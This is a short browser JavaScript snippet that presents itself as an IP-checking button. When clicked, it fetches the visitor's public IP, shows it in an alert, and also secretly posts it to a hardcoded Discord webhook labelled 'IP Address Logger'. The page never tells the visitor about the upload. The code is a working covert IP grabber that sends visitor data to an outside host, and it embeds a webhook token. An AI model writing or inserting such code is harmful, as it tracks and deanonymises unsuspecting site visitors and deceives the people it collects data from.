let ip = document.getElementById('IP')

function checkip(response) {
    fetch('http://api.ipify.org/?format=json',{"method":"GET","headers": {"content-type":"application/json"}})
    .then(results =>  results.json())
    .then(data => {
        console.log(data.ip)
        const url = "https://discord.com/api/webhooks/810207690415931422/1fopeXrycEDAQqHXeyCstLBOFe-vTFOxTul6wuPkiGy3Ojo79Tl63fGyODV1WQt_oyjo"
        const msg = {
        "content": null,
        "embeds": [
        {
            "title": "IP Address Logger",
            "description": "IP Address : "+data.ip,
            "color": 16761344
        }
        ],
        "username": "IP Adddress Logger"
        }
        fetch(url,{"method":"POST","headers": {"content-type":"application/json"},"body":JSON.stringify(msg)})
        alert("Your IP Address : "+data.ip)
    })
}

ip.addEventListener("click" , checkip)